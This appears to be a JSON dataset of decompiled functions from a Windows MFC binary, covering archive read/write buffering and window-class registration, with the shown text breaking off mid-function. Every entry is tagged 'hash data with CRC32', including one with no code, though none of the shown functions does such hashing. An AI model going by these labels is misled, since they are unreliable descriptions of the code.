{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004061c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061c0(uint32_t arg_8h)\n\n{\n    fcn.00401020();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405af2();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00408868": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408868(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.00405f96();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00408635(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00409690(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "004088f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004088f0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    if ((~*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(2, *(in_ECX + 0x14));\n    }\n    uVar1 = *(in_ECX + 0x28) + 2;\n    if (*(in_ECX + 0x2c) <= uVar1 && uVar1 != *(in_ECX + 0x2c)) {\n        fcn.0040921b();\n    }\n    **(in_ECX + 0x28) = arg_8h;\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 2;\n    return;\n}\n",
        "token_count": 192
    },
    "0040892f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040892f(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    if ((~*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(2, *(in_ECX + 0x14));\n    }\n    uVar1 = *(in_ECX + 0x28) + 4;\n    if (*(in_ECX + 0x2c) <= uVar1 && uVar1 != *(in_ECX + 0x2c)) {\n        fcn.0040921b();\n    }\n    **(in_ECX + 0x28) = arg_8h;\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 4;\n    return;\n}\n",
        "token_count": 192
    },
    "0040896d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040896d(ushort *arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(4, *(in_ECX + 0x14));\n    }\n    if (*(in_ECX + 0x2c) < *(in_ECX + 0x28) + 2U) {\n        fcn.00409293((*(in_ECX + 0x28) - *(in_ECX + 0x2c)) + 2);\n    }\n    *arg_8h = **(in_ECX + 0x28);\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 2;\n    return;\n}\n",
        "token_count": 187
    },
    "004089b5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004089b5(uint *arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(4, *(in_ECX + 0x14));\n    }\n    if (*(in_ECX + 0x2c) < *(in_ECX + 0x28) + 4U) {\n        fcn.00409293((*(in_ECX + 0x28) - *(in_ECX + 0x2c)) + 4);\n    }\n    *arg_8h = **(in_ECX + 0x28);\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 4;\n    return;\n}\n",
        "token_count": 186
    },
    "00408c0f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408c0f(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint in_stack_ffffffec;\n    \n    if (arg_8h != 0) goto code_r0x00408c2a;\n    in_stack_ffffffec = *(in_ECX + 0x14);\n    arg_8h_00 = 6;\n    while( true ) {\n        fcn.00409921(arg_8h_00, in_stack_ffffffec);\ncode_r0x00408c2a:\n        if ((~*(in_ECX + 0x18) & 1) != 0) break;\n        arg_8h_00 = 1;\n    }\n    if (*(arg_8h + 8) == 0xffff) {\n        fcn.00405f7a();\n    }\n    fcn.00408ad0(0);\n    puVar2 = fcn.00409f44(arg_8h);\n    uVar1 = *puVar2;\n    if (uVar1 == 0) {\n        fcn.004088f0(0xffff);\n        fcn.004097bc(in_ECX);\n        fcn.0040860a();\n        puVar3 = fcn.00409f44(arg_8h);\n        *puVar3 = *(in_ECX + 0x34);\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        fcn.004088f0(uVar1 | 0x8000);\n    }\n    else {\n        fcn.004088f0(0x7fff);\n        fcn.0040892f(uVar1 | 0x80000000);\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "00408cbe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408cbe(int32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint32_t uVar4;\n    uint arg_8h_01;\n    uint in_stack_ffffffdc;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*(in_ECX + 0x18) & 1) != 0) goto code_r0x00408cdb;\n    in_stack_ffffffdc = *(in_ECX + 0x14);\n    arg_8h_01 = 1;\ncode_r0x00408cd6:\n    do {\n        while( true ) {\n            fcn.00409921(arg_8h_01, in_stack_ffffffdc);\ncode_r0x00408cdb:\n            arg_8h_00 = 0xffff;\n            if ((arg_8h != 0) && (*(arg_8h + 8) == 0xffff)) {\n                fcn.00405f7a();\n            }\n            fcn.00408ad0(0);\n            fcn.0040896d(&var_4h);\n            if (var_4h == 0x7fff) {\n                fcn.004089b5(&var_ch);\n            }\n            else {\n                var_ch = (var_4h & 0x8000) << 0x10 | var_4h & 0x7fff;\n            }\n            if ((var_ch & 0x80000000) != 0) break;\n            if (arg_10h != NULL) {\n                *arg_10h = var_ch;\n                return 0;\n            }\ncode_r0x00408d46:\n            arg_8h_01 = 5;\n        }\n        if (var_4h != -1) {\n            uVar4 = var_ch & 0x7fffffff;\n            if ((uVar4 == 0) || (*(*(in_ECX + 0x38) + 8) - 1U < uVar4)) goto code_r0x00408d46;\n            var_4h = 0;\n            fcn.00409dc2(1, &var_4h);\n            if (var_4h == 0) {\ncode_r0x00408dde:\n                fcn.00405f96();\n                goto code_r0x00408de3;\n            }\n            piVar2 = fcn.004085c8(uVar4);\n            if (*piVar2 == 2) goto code_r0x00408d46;\n            arg_8h_00 = fcn.004085e9(uVar4);\n            var_8h = 0;\n            if ((*(in_ECX + 0x3c) == 0) || (iVar3 = fcn.00409dc2(arg_8h_00, &var_4h),  var_8h = var_4h,  iVar3 == 0)) {\n                var_8h = *(arg_8h_00 + 8) & 0x7fffffff;\n            }\ncode_r0x00408e74:\n            if ((arg_8h == 0) || (iVar3 = fcn.00407049(arg_8h),  iVar3 != 0)) {\n                if (arg_ch == NULL) {\n                    *(in_ECX + 0x10) = var_8h;\n                }\n                else {\n                    *arg_ch = var_8h;\n                }\n                if (arg_10h != NULL) {\n                    *arg_10h = var_ch;\n                }\n                return arg_8h_00;\n            }\ncode_r0x00408d70:\n            arg_8h_01 = 6;\n            goto code_r0x00408cd6;\n        }\n        arg_8h_00 = fcn.00409619(in_ECX, &var_8h);\n        if (arg_8h_00 == 0) goto code_r0x00408d70;\n        if ((*(arg_8h_00 + 8) & 0x7fffffff) == var_8h) {\ncode_r0x00408daf:\n            fcn.0040860a();\n            uVar4 = 1;\n            fcn.0040a1df(*(in_ECX + 0x34), arg_8h_00, 1);\n            var_10h = 0;\n            fcn.00409dc2(1, &var_10h);\n            if (var_10h == 0) goto code_r0x00408dde;\ncode_r0x00408de3:\n            var_4h = uVar4;\n            fcn.00408792(*(in_ECX + 0x34), &var_4h, uVar4);\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n            goto code_r0x00408e74;\n        }\n        if ((*(arg_8h_00 + 8) & 0x80000000) != 0) {\n            fcn.004089fc(0);\n            uVar4 = var_8h;\n            puVar1 = fcn.00409f44(arg_8h_00);\n            *puVar1 = uVar4;\n            goto code_r0x00408daf;\n        }\n        arg_8h_01 = 7;\n    } while( true );\n}\n",
        "token_count": 1279
    },
    "00408ef4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ef4(int32_t *arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t *puVar1;\n    uint arg_8h_01;\n    uint *puVar2;\n    int32_t in_ECX;\n    \n    if ((~*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(2, *(in_ECX + 0x14));\n    }\n    fcn.00408ad0(0);\n    if (arg_8h == NULL) {\n        fcn.004088f0(0);\n    }\n    else {\n        puVar1 = fcn.00409f44(arg_8h);\n        arg_8h_00 = *puVar1;\n        if (arg_8h_00 == 0) {\n            arg_8h_01 = (***arg_8h)();\n            fcn.00408c0f(arg_8h_01);\n            fcn.0040860a();\n            puVar2 = fcn.00409f44(arg_8h);\n            *puVar2 = *(in_ECX + 0x34);\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n            (**(*arg_8h + 8))();\n        }\n        else if (arg_8h_00 < 0x7fff) {\n            fcn.004088f0(arg_8h_00);\n        }\n        else {\n            fcn.004088f0(0x7fff);\n            fcn.0040892f(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00408f90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00408f90(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *arg_ch;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint uVar4;\n    uint var_4h;\n    \n    var_4h = 0x408f9c;\n    fcn.004122ae(0x14);\n    if ((*(extraout_ECX + 0x18) & 1) != 0) goto code_r0x00408fae;\n    var_4h = *(extraout_ECX + 0x14);\n    uVar4 = 4;\ncode_r0x00408fa9:\n    do {\n        fcn.00409921(uVar4, var_4h);\ncode_r0x00408fae:\n        iVar2 = fcn.00408cbe(*(unaff_EBP + 8), unaff_EBP + -0x1c, unaff_EBP + -0x18);\n        *(unaff_EBP + -0x14) = 0;\n        if (iVar2 == 0) {\n            arg_ch = *(unaff_EBP + -0x18);\n            if (*(*(extraout_ECX + 0x38) + 8) + -1 < arg_ch) {\ncode_r0x00408fd9:\n                uVar4 = 5;\n                goto code_r0x00408fa9;\n            }\n            *(unaff_EBP + -0x14) = 0;\n            iVar2 = fcn.00409dc2(1, unaff_EBP + -0x14);\n            if (iVar2 != 0) {\n                iVar2 = *(unaff_EBP + -0x14);\n                if (iVar2 == 0) goto code_r0x00408ffc;\n                goto code_r0x00409001;\n            }\n        }\n        else {\n            *(unaff_EBP + -4) = 0;\n            arg_ch = fcn.00406fff();\n            *(unaff_EBP + -0x14) = arg_ch;\n            if (arg_ch == NULL) {\n                fcn.00405f5e();\n            }\n            fcn.0040860a();\n            fcn.0040a1df(*(extraout_ECX + 0x34), arg_ch, 1);\n            *(unaff_EBP + 8) = 0;\n            fcn.00409dc2(1, unaff_EBP + 8);\n            if (*(unaff_EBP + 8) != 0) {\n                uVar4 = *(extraout_ECX + 0x34);\n                *(unaff_EBP + -0x18) = 2;\n                fcn.00408792(uVar4, unaff_EBP + -0x18, 1);\n                uVar4 = *(unaff_EBP + -0x1c);\n                uVar1 = *(extraout_ECX + 0x10);\n                *(extraout_ECX + 0x34) = *(extraout_ECX + 0x34) + 1;\n                *(extraout_ECX + 0x10) = uVar4;\n                (**(*arg_ch + 8))(extraout_ECX);\n                *(extraout_ECX + 0x10) = uVar1;\ncode_r0x004090c8:\n                fcn.00412353();\n                return;\n            }\ncode_r0x00408ffc:\n            fcn.00405f96();\n            iVar2 = extraout_ECX_00;\ncode_r0x00409001:\n            if (arg_ch <= *(iVar2 + 8) + -1) {\n                piVar3 = fcn.004085c8(arg_ch);\n                if (*piVar3 == 1) goto code_r0x00408fd9;\n            }\n        }\n        iVar2 = fcn.004085e9(arg_ch);\n        if ((iVar2 == 0) || (*(unaff_EBP + 8) == 0)) goto code_r0x004090c8;\n        iVar2 = fcn.00407074(*(unaff_EBP + 8));\n        if (iVar2 != 0) goto code_r0x004090c8;\n        uVar4 = 6;\n    } while( true );\n}\n",
        "token_count": 1060
    },
    "004090ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004090ea(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00409921(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.00405b53(arg_8h, arg_ch, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.00405b53(arg_8h, uVar3, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 937
    },
    "0040921b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040921b(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "00409293": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409293(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_10h;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h_01;\n    int32_t in_stack_ffffffe4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = in_ECX;\n    if ((*(in_ECX + 0x18) & 1) != 0) goto code_r0x004092af;\n    arg_8h_01 = 4;\n    in_stack_ffffffe4 = *(in_ECX + 0x14);\n    do {\n        fcn.00409921(arg_8h_01, in_stack_ffffffe4);\n        iVar4 = in_ECX;\ncode_r0x004092af:\n        in_ECX = in_stack_ffffffe4;\n        arg_10h = *(iVar4 + 0x28);\n        piVar1 = iVar4 + 0x2c;\n        var_4h = *piVar1 - arg_10h;\n        uVar2 = arg_8h + var_4h;\n        if (*(iVar4 + 8) == 0) {\n            arg_8h_00 = *(iVar4 + 0x30);\n            if (arg_8h_00 < arg_10h) {\n                if (0 < var_4h) {\n                    fcn.00406056(arg_8h_00, *piVar1 - arg_8h_00, arg_10h, var_4h);\n                    arg_8h_00 = *(iVar4 + 0x30);\n                    *(iVar4 + 0x28) = arg_8h_00;\n                    *piVar1 = arg_8h_00 + var_4h;\n                }\n                if (*(iVar4 + 0xc) == 0) {\n                    arg_8h = *(iVar4 + 0x20);\n                }\n                arg_8h = arg_8h - var_4h;\n                iVar5 = var_4h + arg_8h_00;\n                do {\n                    iVar3 = (**(**(iVar4 + 0x24) + 0x34))(iVar5, arg_8h);\n                    var_4h = var_4h + iVar3;\n                    arg_8h = arg_8h - iVar3;\n                    iVar5 = iVar5 + iVar3;\n                    if ((iVar3 == 0) || (arg_8h == 0)) break;\n                } while (var_4h < uVar2);\n                *(iVar4 + 0x28) = *(iVar4 + 0x30);\n                *piVar1 = *(iVar4 + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(iVar4 + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(iVar4 + 0x24) + 0x50))(0, *(iVar4 + 0x20), iVar4 + 0x30, piVar1);\n            *(iVar4 + 0x28) = *(iVar4 + 0x30);\n        }\n        if (uVar2 <= *piVar1 - *(iVar4 + 0x28)) {\n            return;\n        }\n        arg_8h_01 = 3;\n        in_stack_ffffffe4 = in_ECX;\n    } while( true );\n}\n",
        "token_count": 839
    },
    "00409382": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409382(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    if ((~*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(2, *(in_ECX + 0x14));\n    }\n    uVar1 = *(in_ECX + 0x28) + 1;\n    if (*(in_ECX + 0x2c) <= uVar1 && uVar1 != *(in_ECX + 0x2c)) {\n        fcn.0040921b();\n    }\n    **(in_ECX + 0x28) = arg_8h;\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 1;\n    return;\n}\n",
        "token_count": 191
    },
    "004093bd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004093bd(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    \n    if ((~*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(2, *(in_ECX + 0x14));\n    }\n    uVar2 = *(in_ECX + 0x28) + 8;\n    if (*(in_ECX + 0x2c) <= uVar2 && uVar2 != *(in_ECX + 0x2c)) {\n        fcn.0040921b();\n    }\n    puVar1 = *(in_ECX + 0x28);\n    *puVar1 = arg_8h;\n    puVar1[1] = arg_ch;\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 8;\n    return;\n}\n",
        "token_count": 221
    },
    "00409401": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409401(uchar *arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(4, *(in_ECX + 0x14));\n    }\n    if (*(in_ECX + 0x2c) < *(in_ECX + 0x28) + 1U) {\n        fcn.00409293((*(in_ECX + 0x28) - *(in_ECX + 0x2c)) + 1);\n    }\n    *arg_8h = **(in_ECX + 0x28);\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 1;\n    return;\n}\n",
        "token_count": 186
    },
    "00409445": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409445(uint *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x18) & 1) == 0) {\n        fcn.00409921(4, *(in_ECX + 0x14));\n    }\n    if (*(in_ECX + 0x2c) < *(in_ECX + 0x28) + 8U) {\n        fcn.00409293((*(in_ECX + 0x28) - *(in_ECX + 0x2c)) + 8);\n    }\n    puVar1 = *(in_ECX + 0x28);\n    *arg_8h = *puVar1;\n    arg_8h[1] = puVar1[1];\n    *(in_ECX + 0x28) = *(in_ECX + 0x28) + 8;\n    return;\n}\n",
        "token_count": 216
    },
    "00409690": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409690(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    int32_t in_ECX;\n    uint32_t arg_14h;\n    int32_t iVar1;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00409921(2, *(in_ECX + 0x14));\n        }\n        arg_ch_00 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        arg_14h = arg_ch;\n        if (arg_ch_00 <= arg_ch) {\n            arg_14h = arg_ch_00;\n        }\n        fcn.00405b53(*(in_ECX + 0x28), arg_ch_00, arg_8h, arg_14h);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_14h;\n        arg_ch = arg_ch - arg_14h;\n        if (arg_ch != 0) {\n            fcn.0040921b();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + arg_14h, iVar1);\n            arg_ch = arg_ch - iVar1;\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            if (arg_ch < *(in_ECX + 0x20)) goto code_r0x00409737;\n            do {\n                fcn.00405f96();\ncode_r0x00409737:\n            } while (*(in_ECX + 0x28) != *(in_ECX + 0x30));\n            fcn.00405b53(*(in_ECX + 0x28), arg_ch, arg_8h + arg_14h + iVar1, arg_ch);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_ch;\n        }\n    }\n    return;\n}\n",
        "token_count": 569
    },
    "0040fc1e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040fc1e(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00407ce3();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.00410fb0(&var_34h, 0, 0x28);\n        var_30h = *0x42c38c;\n        iVar1 = fcn.00407ce3();\n        var_24h = *(iVar1 + 8);\n        var_1ch = *0x437388;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            var_34h = 0xb;\n            var_10h = \"AfxWnd90s\";\n            iVar1 = fcn.0040fb4d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            var_10h = \"AfxOleControl90s\";\n            iVar1 = fcn.0040fb4d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            var_10h = \"AfxControlBar90s\";\n            var_18h = 0x10;\n            iVar1 = fcn.0040fb4d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            var_18h = 0;\n            iVar1 = fcn.0040fbda(&var_34h, \"AfxMDIFrame90s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            var_18h = 6;\n            iVar1 = fcn.0040fbda(&var_34h, \"AfxFrameOrView90s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0040d97d(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0040d97d(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0040d97d(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0040d97d(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0040d97d(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0040d97d(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0040d97d(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0040d97d(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0040d97d(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0040d97d(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0040d97d(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        